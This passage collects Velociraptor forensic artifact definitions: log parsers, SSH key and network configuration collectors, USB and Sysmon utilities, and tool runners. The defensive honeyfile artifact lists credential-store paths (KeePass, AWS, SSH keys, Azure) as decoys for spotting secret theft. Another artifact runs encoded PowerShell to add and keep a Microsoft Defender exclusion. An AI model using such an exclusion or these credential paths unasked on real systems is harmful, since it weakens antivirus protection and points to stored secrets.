# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

sources:
  - precondition:
      SELECT OS From info() where OS =~ 'linux'

    query: |
      -- Get runtime.log
      Let lines = SELECT split(string=Data,sep='\\r?\\n|\\r') as List
        FROM read_file(filenames="/var/log/loginsight/runtime.log")
      -- Get REMOTE_PAK_DOWNLOAD_COMMAND matches.

      LET results = SELECT * FROM foreach(row=lines,
                query={
                    SELECT parse_string_with_regex(
                        string=_value,
                        regex=[
                          "^\\[(?P<Time>[^\\]]+)\\].*REMOTE_PAK_DOWNLOAD_COMMAND.*requestUrl:(?P<RequestUrl>[^,]+), fileName:(?P<FileName>[^\)]+).*$"
                        ]) as Record
                    FROM foreach(row=List)
                    WHERE _value
                    AND _value =~ ".*REMOTE_PAK_DOWNLOAD_COMMAND.*"
                })
      -- output rows
      SELECT 
        Record.Time AS Time,
        Record.RequestUrl AS RequestUrl,
        Record.FileName AS FileName
      FROM results

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Ssh.AuthorizedKeys.yaml
======
name: Windows.Ssh.AuthorizedKeys
author: Ján Trenčanský - j91321@infosec.exchange
description: |
    Find and parse ssh authorized keys files on Windows running OpenSSH service.

reference:
  - https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement?source=recommendations

parameters:
  - name: userSshKeyFiles
    default: '.ssh\authorized_keys*'
    description: Glob of authorized_keys file relative to a user's home directory.

  - name: adminSshKeyFiles
    default: 'administrators_authorized_keys*'
    description: Glob of administrator_authorized_keys

precondition: SELECT OS From info() where OS = 'windows'

type: CLIENT
sources:
    - name: User Keys
      query: |
        LET authorized_keys = SELECT * from foreach(
        row={
          SELECT Uid, Name, Directory from Artifact.Windows.Sys.Users()
        },
        query={
          SELECT OSPath, Mtime, Ctime, Uid
          FROM glob(root=Directory, globs=userSshKeyFiles)
        })
      
        SELECT * from foreach(
            row=authorized_keys,
            query={
                SELECT Uid, OSPath, Key, Comment, Mtime
                FROM split_records(
            filenames=OSPath, regex=" +", columns=["Type", "Key", "Comment"])
        WHERE Type =~ "ssh"
        })
        
    - name: Admin Keys
      query: |
        LET administrators_authorized_keys = SELECT OSPath, Mtime, Ctime, Uid FROM glob(root='C:\\ProgramData\\ssh\\', globs=adminSshKeyFiles)
        SELECT * from foreach(
          row=administrators_authorized_keys,
          query={
            SELECT Uid, OSPath, Key, Comment, Mtime
            FROM split_records(
          filenames=OSPath, regex=" +", columns=["Type", "Key", "Comment"])
        WHERE Type =~ "ssh"
        })
---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.Honeyfile.yaml
======
name: Windows.Detection.Honeyfiles
author: Zane Gittins & Matt Green (@mgreen27).
description: |
    This artifact deploys honeyfiles according to the Honeyfiles CSV parameter. It then monitors access to these files using etw.  The process tracker must be enabled, we use this to enrich etw events. Honeyfiles created by this artifact are removed at exit.

    * TargetPath - Location to create honeyfile.
    * Enabled - Only generate the honeyfile if this is set to 'Y'
    * MagicBytes - The starting magic bytes of the honeyfile.
    * MinSize,MaxSize - The size of the honeyfile will be a random value between MinSize and MaxSize.

type: CLIENT_EVENT

parameters:
  - name: Honeyfiles
    description: The honeyfiles to generate and monitor.
    type: csv
    default: |
        TargetPath,Enabled,MagicBytes,MinSize,MaxSize
        "%USERPROFILE%\Documents\KeePass\KeePass.kdbx",Y,03D9A29A67FB4BB5,10249,20899
        "%USERPROFILE%\AppData\Local\KeePass\KeePass.config.xml",Y,3C3F786D6C,512,1024
        "%USERPROFILE%\AppData\Local\LastPass\lastpass.conf",Y,3C3F786D6C,512,1024
        "%USERPROFILE%\AppData\Roaming\LastPass\loginState.xml",Y,3C3F786D6C,512,1024
        "%USERPROFILE%\AppData\Roaming\WinSCP\WinSCP.ini",Y,5B436F6E66696775726174696F6E5D,512,1024
        "%USERPROFILE%\.aws\credentials",Y,5B64656661756C745D,512,2048
        "%USERPROFILE%\.aws\config",Y,5B64656661756C745D,512,2048
        "%USERPROFILE%\.ssh\my_id_rsa",Y,2D2D2D2D2D424547494E205253412050524956415445204B45592D2D2D2D2D,1024,4096
        "%USERPROFILE%\.gcloud\credentials.db",Y,53514c69746520666f726d6174203300,512,2048
        "%USERPROFILE%\.azure\azureProfile.json",Y,7B0D0A,512,2048
  - name: ProcessExceptionsRegex
    description: Except these processes from detections when they access honeyfiles.
    type: string
    default: "SearchProtocolHost.exe|Explorer.exe"
  - name: HoneyUserRegex
    description: User name regex that will be used to host honeyfiles.
    type: string
    default: "."
export: |
   LET RandomChars(size) = SELECT
       format(format="%02x", args=rand(range=256)) AS HexByte
     FROM range(end=size)
   
   LET check_exist(path) = SELECT
       OSPath,
       Size,
       IsDir,
       if(condition=read_file(filename=OSPath)[-7:] =~ 'VRHoney',
          then=True,
          else=False) AS IsHoneyFile
     FROM stat(filename=path)
   
   LET enumerate_path = SELECT
       regex_replace(source=TargetPath,
                     re='''\%USERPROFILE\%''',
                     replace=Directory) AS TargetPath,
       *,
       check_exist(path=regex_replace(source=TargetPath,
                                      re='''\%USERPROFILE\%''',
                                      replace=Directory))[0] AS Exists,
       MaxSize - rand(range=(MaxSize - MinSize)) - len(
         list=unhex(string=MagicBytes)) - 7 AS _PaddingSize
     FROM Honeyfiles
   
   LET target_users = SELECT Name,
                             Directory,
                             UUID
     FROM Artifact.Windows.Sys.Users()
     WHERE NOT UUID =~ '''^(S-1-5-18|S-1-5-19|S-1-5-20)$'''
      AND Name =~ HoneyUserRegex
   
   LET show_honeyfiles = SELECT TargetPath,
                                Enabled,
                                MagicBytes,
                                MinSize,
                                MaxSize,
                                _PaddingSize,
                                Exists.Size AS Size,
                                Exists.IsHoneyFile AS IsHoneyFile
     FROM foreach(row=target_users, query=enumerate_path)
   
   LET copy_honeyfiles = SELECT
       *,
       if(condition=Enabled =~ "^(Y|YES)$"
           AND (NOT Size OR IsHoneyFile),
          then=log(message="Creating file %v", dedup=-1, args=TargetPath)
           && copy(dest=TargetPath,
                   create_directories='y',
                   accessor='data',
                   filename=unhex(
                     string=MagicBytes + join(
                       array=RandomChars(size=_PaddingSize).HexByte) +
                       format(format='%x', args='VRHoney'))),
          else="File does not exist") AS CreateHoneyFile
     FROM show_honeyfiles
   
   LET remove_honeyfiles = SELECT
       *, _PaddingSize,
       if(condition=IsHoneyFile,
          then=log(message="Removing %v", args=TargetPath, dedup=-1)
           && rm(filename=TargetPath),
          else="File does not exist") AS RemoveHoneyFile
     FROM show_honeyfiles
   
   LET add_honeyfiles = SELECT
       TargetPath,
       Enabled,
       MagicBytes,
       MinSize,
       MaxSize,
       check_exist(path=TargetPath)[0].Size AS Size,
       check_exist(path=TargetPath)[0].IsHoneyFile AS IsHoneyFile
     FROM copy_honeyfiles

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' AND version(plugin="dedup") >= 0

    query: |
       LET _ <= atexit(query={ SELECT * FROM remove_honeyfiles })
       
       LET WatchFiles <= to_dict(item={
           SELECT TargetPath AS _key,
                  IsHoneyFile AS _value
           FROM add_honeyfiles
           WHERE IsHoneyFile
         })
       
       LET Keyword <= 5264
       
       LET CurrentPid <= getpid()
       
       LET TargetEvents = SELECT *
         FROM watch_etw(guid='{edd08927-9cc4-4e65-b970-c2560fb5c289}',
                        description="Microsoft-Windows-Kernel-File",
                        any=Keyword)
         WHERE System.ID = 12
          AND System.ProcessID != CurrentPid
       
       LET AuditEvents = SELECT
           timestamp(string=System.TimeStamp) AS Timestamp,
           get(item=WatchFiles, field=EventData.FileName) AS IsHoneyFile,
           *
         FROM TargetEvents
         WHERE IsHoneyFile != NULL
       
       LET Events = SELECT
           Timestamp,
           System.ProcessID AS Pid,
           EventData.FileName AS TargetPath,
           process_tracker_get(id=System.ProcessID).Data AS ProcInfo,
           join(array=process_tracker_callchain(id=System.ProcessID).Data.Name,
                sep="->") AS CallChain,
           (System.ProcessID + EventData.FileName) AS DedupKey
         FROM AuditEvents
         WHERE NOT ProcInfo.Exe =~ ProcessExceptionsRegex
       
       SELECT Timestamp,
              Pid,
              TargetPath,
              ProcInfo,
              CallChain
       FROM dedup(query={
           SELECT *
           FROM delay(query=Events, delay=5)
         },
                  key="DedupKey",
                  timeout=2)

   
  - precondition:
      SELECT OS From info() where OS = 'windows' AND version(plugin="dedup") = NULL
      
    query: |
       LET _ <= atexit(query={ SELECT * FROM remove_honeyfiles })
       
       LET KernelVolumes <= SELECT *,
                                   regex_replace(source=Name,
                                                 replace='',
                                                 re="^\\\\GLOBAL\\?\\?\\\\") AS UserDrive,
                                   regex_replace(
                                     source=SymlinkTarget,
                                     replace='',
                                     re="^\\\\Device\\\\") AS KernelDrive
         FROM winobj()
         WHERE SymlinkTarget =~ "Volume"
          AND Name =~ "[a-z]:$"
       
       LET WatchFiles <= to_dict(
           item={
           SELECT
           KernelPath AS _key,
           IsHoneyFile AS _value
           FROM foreach(
             row=KernelVolumes,
             query={
           SELECT
           *,
           regex_replace(
             source=TargetPath,
             replace=SymlinkTarget,
             re="[A-Z]+\:") AS KernelPath
           FROM add_honeyfiles
           WHERE TargetPath =~ UserDrive
         })
         })
       
       LET Keyword <= 5264
       
       LET CurrentPid <= getpid()
       
       LET TargetEvents = SELECT
           *
         FROM watch_etw(
           guid='{edd08927-9cc4-4e65-b970-c2560fb5c289}',
           description="Microsoft-Windows-Kernel-File",
           any=Keyword)
         WHERE System.ID = 12
          AND System.ProcessID != CurrentPid
       
       LET AuditEvents = SELECT
           timestamp(
             string=System.TimeStamp) AS Timestamp,
           get(
             item=WatchFiles,
             field=EventData.FileName) AS IsHoneyFile,
           *
         FROM TargetEvents
         WHERE IsHoneyFile != NULL
       
       LET Events = SELECT
           Timestamp,
           IsHoneyFile,
           System.ProcessID AS Pid,
           EventData.FileName AS TargetPath,
           process_tracker_get(
             id=System.ProcessID).Data AS ProcInfo,
           join(
             array=process_tracker_callchain(
               id=System.ProcessID).Data.Name,
             sep="->") AS CallChain
         FROM AuditEvents
         WHERE NOT ProcInfo.Exe =~ ProcessExceptionsRegex
       
       SELECT
           *
       FROM delay(
         query=Events,
         delay=5)

---END OF FILE---

======
FILE: /content/exchange/artifacts/USBPlugIn.yaml
======
name: Windows.Monitor.USBPlugIn
description: |
  Monitor for plug in of USB volume.  Output drive letter for
  additional enrichment artifacts

type: CLIENT_EVENT

sources:
  - query: |
      SELECT
            timestamp(winfiletime=int(int=Parse.TIME_CREATED)) as TimeCreated,
            Parse.DriveName as DriveName,
            Parse.EventType as EventType,
            Parse.__Type as Source,
            Raw
        FROM wmi_events(
            query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2",
            namespace="ROOT/CIMV2",
            wait=50000000)

---END OF FILE---

======
FILE: /content/exchange/artifacts/DefenderExclusion.yaml
======
name: Windows.Utils.DefenderExclusion
description: |
   Adds a Microsoft Defender real-time scanning process exclusion for Velociraptor.
   
   Generally you should not need to use this unless Defender is interfering
   with your collections.
   This may happen if the collection uses tools or associated files that
   trigger Microsoft Defender detections.
   
   Some initial info is also gathered to aid with troubleshooting.
   
   The exclusion is checked every minute by default and reapplied if necessary.
   
   As a side-effect the exclusion also makes some collection operations faster,
   particularly those that are filesystem-intensive and that use the OS 'file'
   accessor.
   
   ### Notes
   
   - Exclusions *do* apply to some Microsoft Defender for Endpoint capabilities,
   such as attack surface reduction rules.
   - Exclusions *do* apply to potentially unwanted apps (PUA) detections as well.
   - Exclusions *do* apply to some ASR rule exclusions. See [Attack surface
   reduction rules reference - Microsoft Defender Antivirus exclusions and ASR
   rules](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#microsoft-defender-antivirus-exclusions-and-asr-rules).
   - Excluded files can still trigger Endpoint Detection and Response (EDR)
   alerts and other detections. To exclude files broadly, add them to the
   Microsoft Defender for Endpoint custom indicators.
   - See References below to learn more about Defender exclusions in general.
   
   A more compact version of this artifact is listed below which can be included
   in the client configuration, as shown, and run with the
   `Client.additional_event_artifacts` setting. This will run the artifact
   as an event artifact as long as the client is running, starting even before
   enrollment. This may be useful if there are specific clients where Defender
   is causing problems.
   
   ```yaml
   autoexec:
     artifact_definitions:
     - name: Windows.Utils.DefenderExclusionCompact
       precondition: SELECT OS From info() where OS = "windows"
       parameters:
         - name: CmdApply
           default: "powershell.exe -ExecutionPolicy Unrestricted -encodedCommand"
       sources:
         - query: |
             LET schedule = SELECT * FROM clock(period=60)
             LET HostInfo <= SELECT * FROM info()
             SELECT {
                      SELECT *
                      FROM execve(
                        argv=[commandline_split(command=CmdApply) + base64encode(
                          string=utf16_encode(
                            string=format(
                              format='Add-MpPreference -ExclusionProcess "%v"',
                              args=HostInfo[0].Exe)))])
                      WHERE log(
                        message="Applied process exclusion: %v",
                        args=HostInfo[0].Exe,
                        level="INFO")
                    }
             FROM schedule
    Client:
      additional_event_artifacts:
      - Windows.Utils.DefenderExclusionCompact
    ```

reference:
  - https://learn.microsoft.com/en-us/defender-endpoint/defender-endpoint-antivirus-exclusions
  - https://learn.microsoft.com/en-us/previous-versions/windows/desktop/defender/add-msft-mppreference
  - https://learn.microsoft.com/en-us/defender-endpoint/configure-local-policy-overrides-microsoft-defender-antivirus
  - https://cloudbrothers.info/en/guide-to-defender-exclusions/

type: CLIENT_EVENT

required_permissions:
  - EXECVE

precondition: SELECT OS From info() where OS = "windows"

parameters:

   - name: CmdApply
     default: "powershell.exe -ExecutionPolicy Unrestricted -encodedCommand"

sources:

  - name: InitialExclusions
    query: |
      LET MpPreference <= SELECT *
                          FROM wmi(query='SELECT * FROM MSFT_MpPreference',
                                   namespace='root/microsoft/windows/defender')
      
      SELECT * FROM column_filter(query=MpPreference, include="Exclusion")

  - name: ApplyExclusion
    query: |
      -- Check on a schedule that the exclusion is still being applied
      LET schedule = SELECT * FROM clock(period=60)

      -- Get the Velociraptor exe location
      LET HostInfo <= SELECT * FROM info()

      -- Checking is not really necessary because adding exclusions is an
      -- idempotent operation but it's useful to see it in the log
      LET ExclusionCheck(VelociExe) =
                SELECT ExclusionProcess
                FROM wmi(query='SELECT * FROM MSFT_MpPreference', namespace='root/microsoft/windows/defender')
                WHERE VelociExe IN ExclusionProcess
                AND log(message="WMI check: %v is excluded", args=ExclusionProcess, dedup=-1, level="INFO")
      
      LET ExclusionApply(VelociExe) =
                SELECT *
                FROM execve(argv=[commandline_split(command=CmdApply) + base64encode(string=utf16_encode(
                        string=format(format='Add-MpPreference -ExclusionProcess "%v"',args=VelociExe)))])
                WHERE log(message="Applied process exclusion: %v", args=VelociExe, dedup=-1, level="INFO")

      SELECT if(condition= NOT ExclusionCheck(VelociExe=HostInfo[0].Exe),
             then={ SELECT ExclusionApply(VelociExe=HostInfo[0].Exe) FROM scope() })
      FROM schedule
      
     

---END OF FILE---

======
FILE: /content/exchange/artifacts/SysmonArchive.yaml
======
name: Windows.Sysinternals.SysmonArchive
author: Matt Green - @mgreen27
description: |
   If configured, Sysmon EID 23: FileDelete enables archiving file deletes on 
   disk. The challenges of this configuration is management of the archive 
   folder which can grow to be significant size and use up disk space.  
   
   This artifact enables management of the archive, listing files and removing 
   old files over a configured maximum.
   
   For monitoring: Use in combination with Windows.Events.SysmonArchive
   
reference:
    - https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/file-delete.md
    - https://isc.sans.edu/diary/Sysmon+and+File+Deletion/26084
    
parameters:
  - name: SysmonArchiveGlob
    description: Glob to target configured Sysmon archive folder contents.
    default: C:\Sysmon\*
  - name: ArchiveSize
    description: Desired size of archive in bytes. Default is ~1GB.
    default: 1000000000
    type: int64
  - name: DeleteFiles
    description: When selected will delete older files outside configured archive size.
    type: bool
  - name: ShowAll
    description: When selected will show all files in Sysmon archive folder.
    type: bool

sources:
  - query: |
      LET files = SELECT Ctime,OSPath,Size
          FROM glob(globs=SysmonArchiveGlob,accessor='ntfs')
          WHERE NOT IsDir AND NOT IsLink
          ORDER BY Ctime DESC
      
      LET calc_sum = SELECT *, sum(item=Size) as TotalSize
        FROM files
        
      SELECT Ctime, OSPath,Size,TotalSize,
        if(condition= TotalSize > ArchiveSize,
            then= if(condition= DeleteFiles, then=rm(filename=OSPath), else='To delete'),
            else= 'Not to delete') as Delete
      FROM calc_sum
      WHERE if(condition= ShowAll,
                then= TRUE,
                else= TotalSize > ArchiveSize) 

---END OF FILE---

======
FILE: /content/exchange/artifacts/Exchange.Windows.EventLogs.Hayabusa.Takajo.yaml
======
name: Exchange.Windows.EventLogs.Hayabusa.Takajo
description: |
   [Takajo] (https://github.com/Yamato-Security/takajo) is a fast forensics analyzer
   for Hayabusa results written in Nim. Takajō means "Falconer" in Japanese
   and was chosen as it analyzes Hayabusa's "catches" (results).
   
   First, it will call Exchange.Windows.EventLogs.Hayabusa to execute the following commandline to create the hayabusa_results.jsonl: "hayabusa.exe json-timeline -d <EVTX-DIR> -L -o hayabusa_results.jsonl -w -p verbose"
   Then, it will be launched Takajo with "automagic" option: which executes as many commands as possible and output results to a "case-0" folder and will upload all the content with the following commandline: "takajo.exe automagic -t hayabusa_tempdir/ -o case-0 "
   All the output results will be uploaded.

author: Eric Capuano - @eric_capuano, Whitney Champion - @shortxstack, Zach Mathis - @yamatosecurity

tools:
 - name: Hayabusa-2.14.0
   url: https://github.com/Yamato-Security/hayabusa/releases/download/v2.14.0/hayabusa-2.14.0-win-x64.zip
   expected_hash: de8abff4f6ed35f28e1e2897659e4f7adcca13ef84d2764afa786ca3f60224ec
 - name: Takajo-2.5.0
   url: https://github.com/Yamato-Security/takajo/releases/download/v2.5.0/takajo-2.5.0-win.zip
   expected_hash: bba76ce84484c53145f7df368560cfeae267729df9c404e570ee7fb544c86b01


precondition: SELECT OS From info() where OS = 'windows'

parameters:
 - name: EvtxDirectory
   description: "Directory of .evtx files"
   default: C:/Windows/System32/winevt/Logs

sources:
 - name: Upload
   query: |
        -- Fetch the binary
        LET ToolzipHB <= SELECT FullPath
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="Hayabusa-2.14.0", IsExecutable=FALSE)

        LET TmpDirHB <= tempdir()

        -- Unzip the binary
        LET _ <= SELECT *
        FROM unzip(filename=ToolzipHB.FullPath, output_directory=TmpDirHB)

        LET HayabusaExe <= TmpDirHB + '\\hayabusa-2.14.0-win-x64.exe'
        LET HayabusaCmd <= "json-timeline"
        LET ResultFileHB <= TmpDirHB + '\\hayabusa_results.jsonl'

        -- Build the command line considering all options
        -- If it does not match if(condition...), it returns Null, so remove Null with filter(....regex=".+")
        LET cmdlineHB <= filter(list=(
          HayabusaExe, HayabusaCmd,
          "-d", EvtxDirectory,
          "-L",
          "-o", ResultFileHB,
          "-w",
          "-p", "verbose",
        ), regex=".+")

        -- Run the tool and divert messages to logs.
        LET ExecHB <= SELECT *
        FROM execve(argv=cmdlineHB, sep="\n", length=9999999)
        WHERE log(message=Stdout)

        -- Fetch the binary
        LET ToolzipTK <= SELECT FullPath
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="Takajo-2.5.0", IsExecutable=FALSE)

        -- Unzip the binary
        LET _ <= SELECT *
        FROM unzip(filename=ToolzipTK.FullPath, output_directory=TmpDirHB)

        LET TakajoExe <= TmpDirHB + '\\takajo.exe'
        LET TakajoCmd <= "automagic"
        LET ResultFileTK <= TmpDirHB + '\\case-0\\'

        -- Build the command line considering all options
        -- If it does not match if(condition...), it returns Null, so remove Null with filter(....regex=".+")
        LET cmdlineTK <= filter(list=(
          TakajoExe, TakajoCmd,
          "-q",
          "-s",
          "-t", TmpDirHB, 
          "-o", ResultFileTK,
        ), regex=".+")

        -- Run the tool and divert messages to logs.
        LET ExecTK <= SELECT *
        FROM execve(argv=cmdlineTK, sep="\n", length=99999999)
        WHERE log(message=Stdout)

        -- Upload the results folder.
        SELECT upload(file=OSPath, accessor=directory) AS Uploads FROM glob(globs="*\**", root=ResultFileTK)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.EchoTrail.yaml
======
name: Server.Enrichment.EchoTrail
author: Eric Capuano - @eric_capuano
description: |
  
  This is a process execution enrichment artifact that can be called from within another artifact (such as one looking at running processes) to enrich the 
  data made available by that artifact. We are calling the EchoTrail v2 API which is still in beta. 
  
  NOTE: The EchoTrail free API is limited to 25 queries per day which is very low for most use cases. This artifact may send more than 25 queries at the API!

  Ex.

    `SELECT * from Artifact.Server.Enrichment.EchoTrail(lookup_image='C:\Windows\system32\svchost.exe', lookup_parent_image='C:\Windows\explorer.exe')`

  Additional lookup parameters that can be passed:

    - `lookup_hostname`: The hostname which the execution occurred on (for host-specific prevelance metrics)
    - `lookup_image_hash`: The SHA256 hash of the process image 
    - `lookup_parent_image_hash`: The SHA256 hash of the process parent image
    - `lookup_commandline`: Command line arguments of the process

type: SERVER

parameters:
    - name: EchoTrailKey
      type: string
      description: API key for EchoTrail. Leave blank here if using server metadata store.
      default:
    - name: lookup_hostname
      type: string
      description: The hostname which the execution occurred on
      default:
    - name: lookup_image
      type: string
      description: The full path to the process image 
      default:
    - name: lookup_image_hash
      type: string
      description: The SHA256 hash of the process image 
      default:
    - name: lookup_parent_image
      type: string
      description: The full path to the process parent image
      default:
    - name: lookup_parent_image_hash
      type: string
      description: The SHA256 hash of the process parent image 
      default:
    - name: lookup_commandline
      type: string
      description: Command line arguments of the process
      default:
    - name: lookup_include_scores
      type: bool
      description: 
      default: true
    - name: lookup_include_description
      type: bool
      description: 
      default: true
    - name: lookup_include_detections
      type: bool
      description: 
      default: true
    - name: record_this_execution
      type: bool
      description: Record this as an actual execution in the EchoTrail database to contribute statistics
      default: false

sources:
  - query: |

        LET Creds = if(
           condition=EchoTrailKey,
           then=EchoTrailKey,
           else=server_metadata().EchoTrailKey)

        LET URL <= 'https://api.echotrail.io/v2/process_execution'

        LET Data = SELECT parse_json(data=Content) AS EchoTrailLookup
        FROM http_client(url=URL,
                         headers=dict(
                          `Accept`="application/json",
                          `x-api-key`=Creds,
                          `Content-Type`="application/json"),
                          method='POST',
                          data=serialize(item=dict(
                            hostname=lookup_hostname,
                            image=lookup_image, 
                            hash=lookup_image_hash,
                            parent_image=lookup_parent_image, 
                            parent_hash=lookup_parent_image_hash,
                            commandline=lookup_commandline, 
                            include_scores=lookup_include_scores,
                            include_description=lookup_include_description,
                            include_detections=lookup_include_detections,
                            record_execution=record_this_execution
                            )
                          )
                        )

        SELECT
            EchoTrailLookup.description AS Description,
            EchoTrailLookup.echotrail_score AS EchoTrailScore,
            EchoTrailLookup.global.rank AS GlobalRank,
            EchoTrailLookup.global.host_prev AS HostPrevalence,
            EchoTrailLookup.global.path_score AS PathScore,
            EchoTrailLookup.global.parent_score AS ParentScore,
            EchoTrailLookup.global.overall_score AS OverallScore,
            EchoTrailLookup AS EchoTrailLookup
        FROM Data

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Forensics.ASL.yaml
======
name: MacOS.Forensics.ASL

author: Yogesh Khatri (@swiftforensics), CyberCX

description: | 
   This artifact parses the ASL (Apple System Log) v2 files located at 
   /private/var/log/asl/*.asl

reference:
- https://github.com/apple-oss-distributions/Libc/blob/Libc-825.25/gen/asl_file.h

type: CLIENT

parameters:
   - name: GlobTable
     type: csv
     default: |
        Glob
        /private/var/log/asl/*.asl
   - name: PathRegex
     description: Filter the path by this regexp
     default: .
   - name: SenderRegex
     description: Filter the Sender by this regexp
     default: .
   - name: MessageRegex
     description: Filter the Message by this regexp
     default: .
   - name: KeyValueRegex
     description: Filter the Keys and Values by this regexp
     default: .
   - name: DateAfter
     type: timestamp
     description: "fetch logs after this date. YYYY-MM-DDTmm:hh:ssZ"
   - name: DateBefore
     type: timestamp
     description: "fetch logs before this date. YYYY-MM-DDTmm:hh:ssZ"

export: |
    LET AslProfile = '''[
    ["Header", 0, [
      ["Cookie", 0, "String", {
         "length": 12
      }],
      ["Version", 12, "uint32b"],
      ["First", 16, "uint64b"],
      ["Time", 24, "Timestamp", {
          type: "uint64b"
      }],
      ["Last", 37, "uint64b"],
      ["Items", "x=>x.First", "Array", {
          count: 10000,
          max_count: 10000,
          type: Message,
          sentinel: "x=>x.Last = x.StartOf",
      }],
    ]],
    ["Message", "x=>x.Next - x.StartOf", [
      ["Zero", 0, "uint16b"],
      ["Len", 2, "uint32b"],
      ["Next", 6, "uint64b"],
      ["ID", 14, "uint64b"],
      ["Time", 22, "Timestamp", {
          type: "uint64b"
      }],
      ["Nano", 30, "uint32b"],
      ["Level", 34, "Enumeration", {
          "type": "uint16b",
          "map": {
              "Emergency" : 0x00000000,
              "Alert"     : 0x00000001, 
              "Critical"  : 0x00000002, 
              "Error"     : 0x00000003, 
              "Warning"   : 0x00000004, 
              "Notice"    : 0x00000005, 
              "Info"      : 0x00000006, 
              "Debug"     : 0x00000007,
          }
      }],
      ["Flags", 36, "uint16b"],
      ["PID", 38, "int32b"],
      ["UID", 42, "int32b"],
      ["GID", 46, "int32b"],
      ["RUID", 50, "int32b"],
      ["RGID", 54, "int32b"],
      ["RefPID", 58, "uint32b"],
      ["KVCount", 62, "uint32b"],
      ["Host", 66, "AslString"],
      ["Sender", 74, "AslString"],
      ["Facility", 82, "AslString"],
      ["Message", 90, "AslString"],
      ["RefProc", 98, "AslString"],
      ["Session", 106, "AslString"],
      ["KeyValues", 114, "Array", {
          count: "x=>x.KVCount/2",
          max_count: 25,
          type: KeyValuePair,
      }],
    ]],
    ["KeyValuePair", 16, [
      ["Key", 0, "AslString"],
      ["Val", 8, "AslString"],
      ["Pair", 0, "Value", { 
        "value": "x=>format(format='{%s:%s}', args=[x.Key.Info.str, x.Val.Info.str])",
      }],
    ]],
    ["AslString", 8, [
      ["z", 0, "int64b"],
      ["s", 0, "Value", { "value": "x=>if(condition=(x.z < 0), 
                                        then='INTERNAL', 
                                        else='EXTERNAL' )"
      }],
      ["Info", 0, "Union", {
         selector: "x=>x.s",
         choices: {
             "INTERNAL": "IntString",
             "EXTERNAL": "ExtString",
         }
      }],
    ]],
    ["IntString", 8, [
      ["z", 0, "uint8b"],
      ["actuallen", 0, "Value", { "value": "x=>if(condition=(x.z=0), 
                                                then=0, 
                                                else=x.z - 128)"
      }],
      ["str", 1, "String", { encoding: "utf8", length: "x=>x.actuallen" }],
    ]],
    ["ExtString", 8, [
      ["Offset", 0, "uint64b"],
      ["Str", 0, "Profile", {
          type: "ExtString2",
          offset: "x=>x.Offset",
      }],
      ["str", 0, "Value", { "value": "x=>x.Str.str" }],
    ]],
    ["ExtString2", "x=>x.len + 6", [
      ["one", 0, "uint16b"],
      ["len", 2, "uint32b"],
      ["str", 6, "String", { encoding: "utf8", length: "x=>x.len" }],
    ]],
    ]'''

precondition: SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET files = SELECT OSPath, Mtime, Btime
        FROM glob(globs=GlobTable.Glob)
        WHERE   log(message=OSPath)

      SELECT * FROM foreach(row=files,
        query={
            SELECT ID, Time, Level, PID, UID, GID, RUID, RGID, RefPID, //KVCount, 
                    Host.Info.str as Host, 
                    Sender.Info.str as Sender,
                    Facility.Info.str as Facility,
                    Message.Info.str as Message,
                    RefProc.Info.str as RefProc,
                    Session.Info.str as Session,
                    KeyValues.Pair as KeyValues,
                    OSPath as SourcePath
                    //OSPath.Basename as SourceFile
            FROM 
                foreach(row=parse_binary(
                    filename=read_file(filename=OSPath, length=1000000),
                    accessor="data",
                    profile=AslProfile, struct="Header").Items)
            WHERE   if(condition=DateAfter, then= Time > DateAfter, else= True )
                AND if(condition=DateBefore, then= Time < DateBefore, else= True )
        })
        WHERE EntryPath =~ PathRegex
            AND Sender =~ SenderRegex
            AND Message =~ MessageRegex
            AND KeyValues =~ KeyValueRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Network.NM.Connections.yaml
======
name: Linux.Network.NM.Connections
author: 'Andreas Misje - @misje'
description: |
  NetworkManager is a popular high-level interface for configuring
  networks in Linux systems, in particular Ubuntu and other Debian-based
  flavours. This artifact lists the NetworkManager state, all configured
  connections and their settings, as well as when the connections were
  last activated. A list of BSSIDs per connection is also retrieved.

  All the information is retrieved from NetworkManager configuration
  files and other state files. Connection information is stored in
  the /etc/NetworkManager/system-connections as long as the "keyfile"
  plugin is selected in /etc/NetworkManager/NetworkManager.conf (this
  is the default). Note that by default, NetworkManager doesn't manage
  connections defined in /etc/network/interfaces.

  Whether the connections are currently active is not stored in file
  and must be queried using using nmcli or through dbus. This artifact
  runs nmcli as an external program to retrieve this information.
  Information such as IP addresses, routes, DNS servers, available Wi-Fi
  networks and other settings will also be collected through nmcli.

  This artifact also exports two functions, parse_ini(filename) and
  parse_ini_as_dict(filename), which may be useful to parse INI files
  in other artifacts.

reference:
  - https://developer-old.gnome.org/NetworkManager/stable/nm-settings-keyfile.html
  - https://developer-old.gnome.org/NetworkManager/stable/settings-connection.html
  - https://developer-old.gnome.org/NetworkManager/stable/settings-802-11-wireless.html

type: CLIENT

required_permissions:
    - EXECVE

parameters:
  - name: RedactSecrets
    default: true
    type: bool
    description: |
        Replace Wi-FI PSKs (wifi-security/psk) with "\<REDACTED\>".

export: |
    /* Parse an INI config file and return Section (the part enclosed in '[]' on
       lines of their own), Key and Value. */
    LET parse_ini(filename) = SELECT * FROM foreach(row={
        SELECT * FROM parse_records_with_regex(file=filename,
            regex='''(?m)\[\s*(?P<Section>[^\]]+)\s*\](?P<Contents>[^\[]*)''')
        }, query={
            SELECT Section, Key, Value
                FROM parse_records_with_regex(file=Contents,
                    accessor='data',
                    regex='^[\s\n]*(?P<Key>[^=]+)=(?P<Value>.*)')
        })

    /* Parse an INI config file and return a single column, Contents, with
       the contents. Section names are prepended to keys, separated by '/'. */
    LET parse_ini_as_dict(filename) = SELECT to_dict(item={
            SELECT lowcase(string=Section + '/' + Key) AS _key, Value AS _value
            FROM parse_ini(filename=filename)
        }) AS Contents
